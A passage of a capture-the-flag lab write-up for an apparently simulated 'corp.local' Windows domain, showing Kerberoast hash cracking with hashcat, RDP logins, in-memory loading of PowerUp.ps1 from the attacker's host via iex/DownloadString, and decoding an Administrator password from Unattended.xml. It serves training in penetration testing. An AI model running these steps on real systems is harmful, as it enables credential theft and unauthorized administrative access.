class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42198" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --quiet     
+$krb5tgs$23$*fela$corp.local$HTTP/fela*$08085ec8f5e1e0a8bf7b15eed00abda7$9b81bbe52c33a771966069a2d53539b9b08357539eea773feb83d88f6817ed90d5d79e0856260cc9dcb81a052bde493a93d8a54d5bb808d0f7702b43793f6d00fc585d4ad986203011efc3a1d1891b263a0db1822a33ec859059cdfbab7d6cb0cd84fdc669fc09a7f1568650499889e99c96571e68c31758355eb5576830331bd6f8904895c3a99ecc1efbcb4f8e56d3d2e4b2c92e3ce809686962d4099bcb30343835e37db9e365684dfe36aff6de30bf7d1a5460c1fcd0badcca3a1e65df154c0180b6c5c6b5d87250165cc3fe53bb93f039d47aa2eed6b040966bb8d164d4f6c13c346ad3644f79bb4dfe05b82472c40fd4308dfd55bd72f13be365a8aff75ab2da7d3e9ad19bc4ab05fbf2daee2e4f25720a02ad20d9b49cc39c647af52c7a0605adcb02c80a7b3df3b43753f386d9a93cc3b461441bcec6d8b46e400856991804186921f9266da396540b0747b8511c3a623a5706fe6d31c5df2ec043db7d6540a5519c11c1cbd7103c9f5482c1c3342db0a5b49ae5d388d93ba9411cc2d37360bbfa91ce7d8cfb768fc609d7f7252d5428cfcf6a5c54b9d3267d910c8e5fc1ddd7c9a1e2e61db42915f09678f1bf4b167a8e93f561dc50b47799f86da710ae326b0adeb9d50c66db1d5a630527b01219908b5c2f4af55ae613735486f37a9f2d93028889d2dcec228a3007227ee8d8fe04b0d8b538c44b74b4f746aa1cf7fdf85cab81eca0c8beb76d1d5d4a939e4b6cc2eda4e9daedbac3c58f32431e34648a8dc5a0c8007fe348a1cc828994328794084ae9a047fdecc189858cbd3160c7d0210df86862fadc63f41156e693352821c5c9cd0a35ef143239abd6ae22d549066c01b0cabededd29a997190587c5d87e562d4cb0385dd338cdea7b51aa87d6fe066565861faf5bce37d5ccc60546b0d07c15ec58e26ee113372a18dffac3fc45d7afd8dc467248c075e3398217b8bdb1ee592d8d2d4f7d09711d7f0235b9ceb121862604625428c05b31cd30469f97be398b5732ccfd608bc5415e2191abe37e4665ad526e574e808767843ab7072fe01ff32ca97b547250a09f03b9b2ac78ccfa38b58f5a4df22043cb49f595d4c11185029237deadbc8d234df49a7f0883f56adf7db7d4375d580ac01b130b72a293ced47549b8d38c1035779dbfe7e185927cd2d1fafd7d886db73f9fb10c97d599e60ce3b294ad38e8ae7108fbd44f96551da2c369dfb26730d22e2ae96aa697beb6096d3f9e0b706ed39005811846b332568cb7715fd6fb6c3c56deb3c42a8aaabec135752d908226107607cc9daaa3969a992ddc2d5981b713d92e5dac98c8c634d066a938910ad0d3ab03cd59cabe8dfa52ce9d2b5ce11443e3b2c183075611bacd9d0aa3b3c0fe9ae82b6dffac:rubenF124
+</pre> </div> </div> <p><br> RDP into the machine as the new user that we now have creds for.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42459"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42459')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42459')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42459')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42459')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42459">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ xfreerdp /u:fela /p:rubenF124 /v:10.10.236.143 /dynamic-resolution +clipboard
+[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - CN = omega.corp.local
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.236.143:3389) 
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - Common Name (CN):
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] -      omega.corp.local
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+Certificate details for 10.10.236.143:3389 (RDP-Server):
+        Common Name: omega.corp.local
+        Subject:     CN = omega.corp.local
+        Issuer:      CN = omega.corp.local
+        Thumbprint:  ff:e5:5c:61:fc:8e:9b:be:1d:84:53:ad:7f:58:63:14:cb:23:03:e1:18:84:22:fc:d0:70:46:c5:22:e0:d9:8c
+The above X.509 certificate could not be verified, possibly because you do not have
+the CA certificate in your certificate store, or the certificate has expired.
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+Do you trust the above certificate? (Y/T/N) Y
+[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+[00:51:25:131] [37053:37054] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42459" onclick="terminalOverlayClose('bash-bash-42459')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42459')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42459')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42459')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42459" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ xfreerdp /u:fela /p:rubenF124 /v:10.10.236.143 /dynamic-resolution +clipboard
+[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - CN = omega.corp.local
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.236.143:3389) 
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - Common Name (CN):
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] -      omega.corp.local
+[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+Certificate details for 10.10.236.143:3389 (RDP-Server):
+        Common Name: omega.corp.local
+        Subject:     CN = omega.corp.local
+        Issuer:      CN = omega.corp.local
+        Thumbprint:  ff:e5:5c:61:fc:8e:9b:be:1d:84:53:ad:7f:58:63:14:cb:23:03:e1:18:84:22:fc:d0:70:46:c5:22:e0:d9:8c
+The above X.509 certificate could not be verified, possibly because you do not have
+the CA certificate in your certificate store, or the certificate has expired.
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+Do you trust the above certificate? (Y/T/N) Y
+[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+[00:51:25:131] [37053:37054] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
+</pre> </div> </div> <p><br> Get the first flag.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/corp/flag1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="First Flag" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the PowerUp.ps1 PowerShell script.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41229"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41229')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41229')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41229')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41229')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41229">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 --inet4-only
+--2025-03-02 00:55:17--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 494860 (483K) [text/plain]
+Saving to: ‘PowerUp.ps1’
+
+PowerUp.ps1                                                100%[========================================================================================================================================&gt;] 483.26K  --.-KB/s    in 0.1s    
+
+2025-03-02 00:55:18 (3.26 MB/s) - ‘PowerUp.ps1’ saved [494860/494860]
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41229" onclick="terminalOverlayClose('bash-bash-41229')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41229')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41229')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41229')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41229" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 --inet4-only
+--2025-03-02 00:55:17--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 494860 (483K) [text/plain]
+Saving to: ‘PowerUp.ps1’
+
+PowerUp.ps1                                                100%[========================================================================================================================================&gt;] 483.26K  --.-KB/s    in 0.1s    
+
+2025-03-02 00:55:18 (3.26 MB/s) - ‘PowerUp.ps1’ saved [494860/494860]
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> </div> <p><br> Run all of the checks from the PowerUp script.</p> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-101295"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-101295')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-101295')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-101295')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-101295')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-101295">
+PS C:\Windows\system32&gt; iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/PowerUp.ps1")
+PS C:\Windows\system32&gt; Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+
+[*] Checking for unquoted service paths...
+
+
+[*] Checking service executable and argument permissions...
+
+
+[*] Checking service permissions...
+
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+
+HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
+                 -Command '...'
+
+
+
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+[*] Checking for Autologon credentials in registry...
+
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+
+[*] Checking for vulnerable schtask files/configs...
+
+
+[*] Checking for unattended install files...
+
+
+UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
+
+
+
+
+
+[*] Checking for encrypted web.config strings...
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-101295" onclick="terminalOverlayClose('powershell-powershell-101295')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-101295')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-101295')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-101295')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-101295" data-language="powershell">
+PS C:\Windows\system32&gt; iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/PowerUp.ps1")
+PS C:\Windows\system32&gt; Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+
+[*] Checking for unquoted service paths...
+
+
+[*] Checking service executable and argument permissions...
+
+
+[*] Checking service permissions...
+
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+
+HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
+                 -Command '...'
+
+
+
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+[*] Checking for Autologon credentials in registry...
+
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+
+[*] Checking for vulnerable schtask files/configs...
+
+
+[*] Checking for unattended install files...
+
+
+UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
+
+
+
+
+
+[*] Checking for encrypted web.config strings...
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+</pre> </div> </div> <p><br> Check the unattended.xml file looking for encoded passwords.</p> <div class="terminal" data-language="cmd" id="terminal-cmd-exe-cmd-773"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('cmd-exe-cmd-773')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('cmd-exe-cmd-773')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('cmd-exe-cmd-773')" title="Maximize"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopy('cmd-exe-cmd-773')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-cmd-exe-cmd-773">
+PS C:\Windows\system32&gt; type C:\Windows\Panther\Unattend\Unattended.xml
+</pre> </div> <div class="terminal__overlay" id="overlay-cmd-exe-cmd-773" onclick="terminalOverlayClose('cmd-exe-cmd-773')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('cmd-exe-cmd-773')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('cmd-exe-cmd-773')" title="Restore"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopyModal('cmd-exe-cmd-773')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-cmd-exe-cmd-773" data-language="cmd">
+PS C:\Windows\system32&gt; type C:\Windows\Panther\Unattend\Unattended.xml
+</pre> </div> </div> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">unattended.xml</span> </div> <pre class="codebox__body">
+&lt;AutoLogon&gt;
+    &lt;Password&gt;
+        &lt;Value&gt;dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=&lt;/Value&gt;
+        &lt;PlainText&gt;false&lt;/PlainText&gt;
+    &lt;/Password&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Username&gt;Administrator&lt;/Username&gt;
+&lt;/AutoLogon&gt;
+</pre> </div> <p><br> Decode the password from the unattended.xml file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4140"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4140')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4140')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4140')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4140')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4140">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ echo 'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=' | base64 -d
+tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4140" onclick="terminalOverlayClose('bash-bash-4140')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4140')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4140')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4140')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4140" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ echo 'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=' | base64 -d
+tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+</pre> </div> </div> <p><br> RDP into the machine as the Administrator with the password from the unattended.xml file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4919"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4919')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4919')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4919')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4919')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4919">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ xfreerdp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.236.143 /dynamic-resolution +clipboard
+[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - CN = omega.corp.local
+[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4919" onclick="terminalOverlayClose('bash-bash-4919')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4919')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4919')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4919')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4919" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ xfreerdp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.236.143 /dynamic-resolution +clipboard
+[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - CN = omega.corp.local
+[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
